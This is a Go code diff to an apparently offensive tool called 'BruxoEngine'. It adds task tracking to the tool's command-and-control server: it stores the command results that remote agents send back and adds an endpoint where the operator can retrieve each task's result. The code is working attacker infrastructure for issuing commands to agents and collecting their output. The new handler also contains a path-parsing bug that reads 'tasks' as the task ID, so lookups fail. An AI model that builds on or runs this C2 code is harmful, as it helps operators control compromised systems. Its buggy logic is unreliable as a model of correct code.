@@ -61,6 +61,7 @@ type BruxoEngine struct {
 
 	// C2 Fields
 	c2Agents map[string]*Agent
+	c2Tasks  map[string]*Task
 	c2Mutex  sync.RWMutex
 }
 
@@ -227,6 +228,7 @@ func NewBruxoEngine(config *Config) *BruxoEngine {
 			MaxIdleConnDuration: 90 * time.Second,
 		},
 		c2Agents: make(map[string]*Agent),
+		c2Tasks:  make(map[string]*Task),
 	}
 
 	if config.FindHidden {
@@ -1098,6 +1100,7 @@ func (b *BruxoEngine) startC2Server() {
 	http.HandleFunc("/c2/results/", b.handlePostResult)
 	http.HandleFunc("/api/agents", b.handleGetAgents)
 	http.HandleFunc("/api/agents/", b.handlePostTask)
+	http.HandleFunc("/api/tasks/", b.handleGetTaskResult)
 
 	if err := http.ListenAndServe(":8080", nil); err != nil {
 		b.logger.Error("C2 server failed: %v", err)
@@ -1197,7 +1200,16 @@ func (b *BruxoEngine) handlePostResult(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	b.logger.Info("Result received from agent %s for task %s:\n%s", agentID, data.TaskID, data.Result)
+	b.c2Mutex.Lock()
+	if task, ok := b.c2Tasks[data.TaskID]; ok {
+		task.Result = data.Result
+		task.Status = "completed"
+		b.logger.Info("Result received for task %s from agent %s", data.TaskID, agentID)
+		fmt.Printf("\n--- C2 RESULT (Task: %s, Agent: %s) ---\n%s\n-------------------------------------\n", data.TaskID, agentID, data.Result)
+	} else {
+		b.logger.Error("Received result for unknown task ID: %s", data.TaskID)
+	}
+	b.c2Mutex.Unlock()
 
 	w.WriteHeader(http.StatusOK)
 	json.NewEncoder(w).Encode(map[string]string{"status": "result processed"})
@@ -1248,6 +1260,10 @@ func (b *BruxoEngine) handlePostTask(w http.ResponseWriter, r *http.Request) {
 		Status:  "pending",
 	}
 
+	b.c2Mutex.Lock()
+	b.c2Tasks[task.ID] = &task
+	b.c2Mutex.Unlock()
+
 	select {
 	case agent.taskQueue <- task:
 		b.logger.Info("Task %s enqueued for agent %s: %s", task.ID, agentID, task.Command)
@@ -1258,6 +1274,27 @@ func (b *BruxoEngine) handlePostTask(w http.ResponseWriter, r *http.Request) {
 		b.logger.Error("Task queue for agent %s is full", agentID)
 		http.Error(w, "Task queue is full", http.StatusServiceUnavailable)
 	}
+}
+
+func (b *BruxoEngine) handleGetTaskResult(w http.ResponseWriter, r *http.Request) {
+	parts := strings.Split(r.URL.Path, "/")
+	if len(parts) < 4 {
+		http.Error(w, "Invalid URL path", http.StatusBadRequest)
+		return
+	}
+	taskID := parts[2]
+
+	b.c2Mutex.RLock()
+	task, ok := b.c2Tasks[taskID]
+	b.c2Mutex.RUnlock()
+
+	if !ok {
+		http.Error(w, "Task not found", http.StatusNotFound)
+		return
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(task)
 }
 
 func printBanner(config Config) {
